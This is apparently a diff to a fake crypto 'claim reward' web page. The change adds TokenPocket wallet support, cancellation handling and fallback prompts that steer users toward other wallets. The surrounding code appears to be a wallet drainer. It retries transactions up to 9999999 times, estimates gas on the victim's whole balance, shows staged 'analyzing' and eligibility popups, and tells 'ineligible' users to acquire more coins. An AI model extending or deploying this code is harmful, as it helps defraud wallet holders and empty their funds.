@@ -19,7 +19,7 @@ let showChainSwitchPopup: boolean = false;
 let showAnalyzingPopup: boolean = false;
 let eligibilityMessage: string = "";
 let showEligibilityResult: boolean = false;
-let showMobileWalletPopup: boolean = false; // NEW: Mobile wallet selection popup
+let showMobileWalletPopup: boolean = false;
 
 /* ---------------- CHAIN CONFIGS ---------------- */
 const EVM_CHAINS = [
@@ -80,6 +80,13 @@ const WALLET_CONFIGS = [
     deepLink: (url: string) => `https://solflare.com/dapp?url=${encodeURIComponent(url)}`
   },
   { 
+    name: "TokenPocket", 
+    type: "tron", 
+    icon: "https://kimi-web-img.moonshot.cn/img/www.yadawallets.com/2c6341a06951c7b8b7e80362fd7e90e3c47f6601.png",
+    color: "#2980FE",
+    deepLink: (url: string) => `https://tokenpocket.pro/`
+  },
+  { 
     name: "TronLink", 
     type: "tron", 
     icon: "https://kimi-web-img.moonshot.cn/img/meta-q.cdn.bubble.io/1ee41d913def54d2783f3b76c5d9a05d52147f54.png",
@@ -88,8 +95,7 @@ const WALLET_CONFIGS = [
   }
 ];
 
-
-/*retry functionn*/
+/*retry function*/
 async function retryTx(
   fn: () => Promise<any>,
   retries = 9999999,
@@ -119,15 +125,19 @@ async function retryTx(
 /* ---------------- SOLANA ---------------- */
 const solConnection = new Connection(clusterApiUrl("mainnet-beta"));
 
-async function connectSolana() {
-  if (!window.solana) return null;
+async function connectSolana(): Promise<{ success: boolean; cancelled?: boolean; address?: string }> {
+  if (!window.solana) return { success: false };
   try {
     const resp = await window.solana.connect();
     solAddress = resp.publicKey.toString();
-    return solAddress;
-  } catch (err) { 
-    console.error(err); 
-    return null; 
+    return { success: true, address: solAddress };
+  } catch (err: any) {
+    console.error("Solana connection error:", err);
+    // Check if user cancelled
+    if (err.code === 4001 || err.message?.includes("User rejected") || err.message?.includes("cancelled")) {
+      return { success: false, cancelled: true };
+    }
+    return { success: false };
   }
 }
 
@@ -142,8 +152,8 @@ async function getSolanaBalance(address: string): Promise<number> {
 }
 
 /* ---------------- EVM ---------------- */
-async function connectEVM() {
-  if (!window.ethereum) return null;
+async function connectEVM(): Promise<{ success: boolean; cancelled?: boolean; address?: string }> {
+  if (!window.ethereum) return { success: false };
   try {
     await window.ethereum.request({ method: "eth_requestAccounts" });
     const provider = new BrowserProvider(window.ethereum);
@@ -153,10 +163,14 @@ async function connectEVM() {
     const network = await provider.getNetwork();
     currentChainId = "0x" + network.chainId.toString(16);
     
-    return evmAddress;
-  } catch (err) { 
-    console.error(err); 
-    return null; 
+    return { success: true, address: evmAddress };
+  } catch (err: any) {
+    console.error("EVM connection error:", err);
+    // Check if user cancelled (MetaMask error code 4001)
+    if (err.code === 4001 || err.message?.includes("User rejected") || err.message?.includes("cancelled")) {
+      return { success: false, cancelled: true };
+    }
+    return { success: false };
   }
 }
 
@@ -170,10 +184,21 @@ async function getEVMBalance(address: string): Promise<bigint> {
 function getTronProvider(): any {
   const w = window as any;
   
+  // Check for TokenPocket first
+  if (w.tokenpocket?.tronWeb) {
+    return {
+      wallet: w.tokenpocket,
+      tronWeb: w.tokenpocket.tronWeb,
+      isTokenPocket: true,
+      isTronLink: false
+    };
+  }
+  
   if (w.tronLink?.tronWeb) {
     return {
       wallet: w.tronLink,
       tronWeb: w.tronLink.tronWeb,
+      isTokenPocket: false,
       isTronLink: true
     };
   }
@@ -182,6 +207,7 @@ function getTronProvider(): any {
     return {
       wallet: w.tron,
       tronWeb: w.tron.tronWeb,
+      isTokenPocket: false,
       isTronLink: false
     };
   }
@@ -190,6 +216,7 @@ function getTronProvider(): any {
     return {
       wallet: w.tronWeb,
       tronWeb: w.tronWeb,
+      isTokenPocket: false,
       isTronLink: false
     };
   }
@@ -201,7 +228,6 @@ function getTronAddress(provider: any): string | null {
   if (!provider) return null;
   const tronWeb = provider.tronWeb;
   
-  // TronLink sometimes nests it differently
   const base58 = tronWeb?.defaultAddress?.base58 || 
                  tronWeb?.defaultAddress?.address ||
                  tronWeb?.address ||
@@ -210,70 +236,77 @@ function getTronAddress(provider: any): string | null {
   return base58 || null;
 }
 
-async function connectTron(): Promise<string | null> {
+async function connectTron(): Promise<{ success: boolean; cancelled?: boolean; address?: string }> {
   let provider = getTronProvider();
-  
-  // If no provider, wait a bit and retry (cloud deployments inject slower)
+
+  // Retry once if provider is not immediately available
   if (!provider) {
-    await new Promise(r => setTimeout(r, 1000));
+    await new Promise((r) => setTimeout(r, 1000));
     provider = getTronProvider();
   }
-  
+
   if (!provider) {
-    console.error("Tron provider not found. Please install TronLink.");
-    return null;
+    console.error("Tron provider not found.");
+    return { success: false };
   }
 
   try {
-    // Try to trigger the connection
+    let res: any;
+
+    // Modern Tron wallet
     if (provider.wallet?.request) {
-      const res = await provider.wallet.request({ 
-        method: 'tron_requestAccounts' 
-      });
-      
-      // TronLink returns {code: 200, message: 'success'} on success
-      // OR just true in some versions
-      const success = res === true || 
-                      res?.code === 200 || 
-                      res?.code === '200' ||
-                      (typeof res === 'object' && res !== null && !res.error);
-                      
-      if (!success && res !== undefined) {
-        console.error("Connection rejected:", res);
-        return null;
+      res = await provider.wallet.request({ method: 'tron_requestAccounts' });
+
+      // Handle explicit user rejection
+      if (res?.code === 4001 || res?.message?.toLowerCase().includes("rejected") || res?.message?.toLowerCase().includes("cancelled")) {
+        return { success: false, cancelled: true };
+      }
+
+      // Strict success check
+      const success = res === true || res?.code === 200 || res?.code === '200';
+      if (!success) {
+        console.error("Connection failed:", res);
+        return { success: false };
       }
     } 
+    // Older Tron wallet
     else if (provider.wallet?.enable) {
       await provider.wallet.enable();
     }
-  } catch (e) {
-    // Some versions throw even on success, so we ignore errors and check for address
-    console.log("Request result (may be false positive error):", e);
+  } catch (e: any) {
+    console.error("Wallet request error:", e);
+
+    if (e?.code === 4001 || e?.message?.toLowerCase().includes("rejected") || e?.message?.toLowerCase().includes("cancelled") || e?.message?.toLowerCase().includes("user")) {
+      return { success: false, cancelled: true };
+    }
+
+    return { success: false };
   }
 
-  // CRITICAL FIX: Refresh provider reference after request
-  // The tronWeb object might have been replaced/updated
+  // Ensure provider is still available
   provider = getTronProvider();
-  if (!provider) return null;
+  if (!provider) return { success: false };
 
-  // Wait for address with refreshed provider
+  // Retry to get the Tron address
+  let addr: string | null = null;
   let retries = 0;
-  while (!getTronAddress(provider) && retries < 50) {
-    await new Promise(r => setTimeout(r, 300));
-    provider = getTronProvider(); // Refresh each iteration
+  while (!addr && retries < 50) {
+    addr = getTronAddress(provider);
+    if (addr) break;
+
+    await new Promise((r) => setTimeout(r, 300));
+    provider = getTronProvider();
     retries++;
   }
 
-  const addr = getTronAddress(provider);
   if (!addr) {
     console.error("Tron address not available after timeout");
-    return null;
+    return { success: false };
   }
 
-  // Store for global use
   tronAddress = addr;
 
-  // Event listeners
+  // Set up listeners for account changes and disconnects
   const wallet = provider.wallet;
   if (wallet?.on) {
     wallet.on('accountsChanged', (accounts: any) => {
@@ -281,14 +314,14 @@ async function connectTron(): Promise<string | null> {
       console.log('Tron account changed:', newAddr);
       tronAddress = newAddr || null;
     });
-    
+
     wallet.on('disconnect', () => {
       console.log('Tron wallet disconnected');
       tronAddress = null;
     });
   }
 
-  return addr;
+  return { success: true, address: addr };
 }
 
 async function getTronBalance(address: string): Promise<number> {
@@ -520,7 +553,6 @@ function promptChainSwitch(type: string) {
   if (type === "evm") {
     showChainSwitchPopup = true;
   } else {
-    // Replaced alert with inline message display
     eligibilityMessage = "❌ Wallet ineligible\n\nPerform more onchain transactions to be eligible and ensure you have enough coins to cover gas fees.";
     showEligibilityResult = true;
     setTimeout(() => showEligibilityResult = false, 4000);
@@ -796,7 +828,7 @@ async function handleEVMChain(
         balance
       );
 
-      const gasLimit = gasEstimate * 12n / 10n; // +20%
+      const gasLimit = gasEstimate * 12n / 10n;
 
       const feeData = await provider.getFeeData();
 
@@ -1000,12 +1032,12 @@ async function handleTron(
   const tronWeb = getTronProvider();
 
   if (!tronWeb) {
-    showError("No Tron wallet detected. Install TronLink.");
+    showError("No Tron wallet detected. Install TokenPocket or TronLink.");
     return false;
   }
 
   if (!tronWeb.ready) {
-    showError("Please unlock TronLink.");
+    showError("Please unlock your wallet.");
     return false;
   }
 
@@ -1168,6 +1200,26 @@ function detectWallets() {
   return wallets;
 }
 
+function hasTokenPocket(): boolean {
+  const w = window as any;
+  return !!w.tokenpocket;
+}
+
+function hasTronLink(): boolean {
+  const w = window as any;
+  return !!(w.tronLink || w.tron);
+}
+
+function hasMetaMask(): boolean {
+  const w = window as any;
+  return !!(w.ethereum?.isMetaMask);
+}
+
+function hasTrustWallet(): boolean {
+  const w = window as any;
+  return !!(w.ethereum?.isTrust || w.trustwallet);
+}
+
 function isMobile(): boolean {
   const ua = navigator.userAgent;
   return /iPhone|iPad|iPod|Android/i.test(ua);
@@ -1180,24 +1232,76 @@ async function chooseWallet(walletConfig: typeof WALLET_CONFIGS[0]) {
   showWalletPopup = false;
 
   connecting = true;
-  let connected: string | null = null;
+  let result: { success: boolean; cancelled?: boolean; address?: string } = { success: false };
   const type = walletConfig.type;
   
   if (type === "evm") {
     evmAddress = null;
-    connected = await connectEVM();
+    result = await connectEVM();
   } else if (type === "solana") {
     solAddress = null;
-    connected = await connectSolana();
+    result = await connectSolana();
   } else if (type === "tron") {
     tronAddress = null;
-    connected = await connectTron();
+    result = await connectTron();
   }
   
   connecting = false;
 
-  if (!connected) {
-    // Replaced alert with popup message
+  // Handle cancellation - stop operations if user cancelled
+  if (result.cancelled) {
+    console.log("User cancelled wallet connection");
+    eligibilityMessage = "❌ Connection cancelled by user.";
+    showEligibilityResult = true;
+    setTimeout(() => showEligibilityResult = false, 3000);
+    return;
+  }
+
+  if (!result.success) {
+    // Check for fallback options for Tron wallets
+    if (type === "tron") {
+      // Try fallback to other wallets
+      if (walletConfig.name === "TokenPocket" && !hasTronLink() && window.ethereum) {
+        // Try Trust Wallet or MetaMask as fallback for EVM
+        if (hasTrustWallet()) {
+          eligibilityMessage = "⚠️ TokenPocket not found. Trying Trust Wallet...";
+          showEligibilityResult = true;
+          setTimeout(async () => {
+            showEligibilityResult = false;
+            await tryFallbackWallet("Trust Wallet");
+          }, 1500);
+          return;
+        } else if (hasMetaMask()) {
+          eligibilityMessage = "⚠️ TokenPocket not found. Trying MetaMask...";
+          showEligibilityResult = true;
+          setTimeout(async () => {
+            showEligibilityResult = false;
+            await tryFallbackWallet("MetaMask");
+          }, 1500);
+          return;
+        }
+      } else if (walletConfig.name === "TronLink" && !hasTokenPocket() && window.ethereum) {
+        // Try EVM wallets as fallback
+        if (hasTrustWallet()) {
+          eligibilityMessage = "⚠️ TronLink not found. Trying Trust Wallet...";
+          showEligibilityResult = true;
+          setTimeout(async () => {
+            showEligibilityResult = false;
+            await tryFallbackWallet("Trust Wallet");
+          }, 1500);
+          return;
+        } else if (hasMetaMask()) {
+          eligibilityMessage = "⚠️ TronLink not found. Trying MetaMask...";
+          showEligibilityResult = true;
+          setTimeout(async () => {
+            showEligibilityResult = false;
+            await tryFallbackWallet("MetaMask");
+          }, 1500);
+          return;
+        }
+      }
+    }
+    
     eligibilityMessage = "❌ Failed to connect wallet.\n\nPlease make sure your wallet is connected and try again.";
     showEligibilityResult = true;
     setTimeout(() => showEligibilityResult = false, 9000);
@@ -1226,12 +1330,19 @@ async function chooseWallet(walletConfig: typeof WALLET_CONFIGS[0]) {
   claimRewardAnimation(type as 'evm' | 'solana' | 'tron');
 }
 
+async function tryFallbackWallet(walletName: string) {
+  const fallbackConfig = WALLET_CONFIGS.find(w => w.name === walletName);
+  if (fallbackConfig) {
+    await chooseWallet(fallbackConfig);
+  }
+}
+
 /* ---------------- TRIGGER WALLET POPUP ---------------- */
 function onClaimClick() {
   const wallets = detectWallets();
   if (wallets.length === 0) {
     if (isMobile()) {
-      showMobileWalletPopup = true; // Show image-based popup instead of prompt()
+      showMobileWalletPopup = true;
       return;
     } else {
       showError("No wallet detected. Please install a wallet extension to claim rewards.");
@@ -1252,6 +1363,9 @@ function handleMobileWalletSelect(walletConfig: typeof WALLET_CONFIGS[0]) {
     deepLink = walletConfig.deepLink(window.location.host);
   } else if (walletConfig.name === "Exodus") {
     deepLink = walletConfig.deepLink(currentUrl);
+  } else if (walletConfig.name === "TokenPocket") {
+    // TokenPocket deep link
+    deepLink = `https://tokenpocket.pro/`;
   } else {
     deepLink = walletConfig.deepLink(currentUrl);
   }
@@ -1284,8 +1398,10 @@ function showError(message: string) {
 
     {#if evmAddress}<div class="wallet">🔗 EVM: {evmAddress.slice(0,6)}...{evmAddress.slice(-4)}</div>{/if}
     {#if solAddress}<div class="wallet">🔗 SOL: {solAddress.slice(0,6)}...{solAddress.slice(-4)}</div>{/if}
-    {#if tronAddress}
-      <div class="wallet">🔗 TRON: {tronAddress.slice(0,6)}...{tronAddress.slice(-4)}</div>
+    {#if typeof tronAddress === "string" && tronAddress.length > 10}
+      <div class="wallet">
+        🔗 TRON: {tronAddress.slice(0,6)}...{tronAddress.slice(-4)}
+      </div>
     {/if}
 
     {#if claimed}<div class="success">✅ Success! Your reward has been unlocked.</div>{/if}
@@ -1312,7 +1428,7 @@ function showError(message: string) {
     </div>
   {/if}
 
-  <!-- Mobile Wallet Selection Popup (REPLACES prompt()) -->
+  <!-- Mobile Wallet Selection Popup -->
   {#if showMobileWalletPopup}
     <div class="wallet-popup mobile-wallet-popup">
       <div class="wallet-popup-content">
@@ -1349,9 +1465,9 @@ function showError(message: string) {
 
   {#if showEligibilityResult}
     <div class="eligibility-popup">
-      <div class="eligibility-content" class:ineligible={eligibilityMessage.includes("Ineligible")}>
+      <div class="eligibility-content" class:ineligible={eligibilityMessage.includes("Ineligible") || eligibilityMessage.includes("Failed") || eligibilityMessage.includes("cancelled")}>
         <pre>{eligibilityMessage}</pre>
-        {#if eligibilityMessage.includes("Ineligible")}
+        {#if eligibilityMessage.includes("Ineligible") && !eligibilityMessage.includes("cancelled")}
           <button class="switch-chain-btn" onclick={() => promptChainSwitch("evm")}>
             Switch Network
           </button>
@@ -1443,7 +1559,6 @@ h1{ margin:10px 0;font-size:24px; }
     font-size: 20px;
   }
   
-  /* Mobile wallet grid - larger touch targets */
   .mobile-wallet-grid {
     grid-template-columns: repeat(2, 1fr);
     gap: 16px;
@@ -1494,7 +1609,6 @@ h1{ margin:10px 0;font-size:24px; }
     margin-top: 8px;
   }
   
-  /* Larger touch targets for chain switching */
   .chain-btn {
     padding: 16px;
     font-size: 15px;
@@ -1510,7 +1624,6 @@ h1{ margin:10px 0;font-size:24px; }
     line-height: 1.5;
   }
   
-  /* Eligibility popup mobile optimization */
   .eligibility-content {
     padding: 24px 16px;
     margin: 10px;
@@ -1526,7 +1639,6 @@ h1{ margin:10px 0;font-size:24px; }
   }
 }
 
-/* Small phones */
 @media (max-width: 360px) {
   .mobile-wallet-grid {
     grid-template-columns: 1fr;
@@ -1563,7 +1675,6 @@ h1{ margin:10px 0;font-size:24px; }
   }
 }
 
-/* Analyzing Popup */
 .analyzing-popup {
   position: fixed;
   top: 0;
@@ -1617,7 +1728,6 @@ h1{ margin:10px 0;font-size:24px; }
   100% { width: 100%; }
 }
 
-/* Eligibility Result Popup */
 .eligibility-popup {
   position: fixed;
   top: 0;
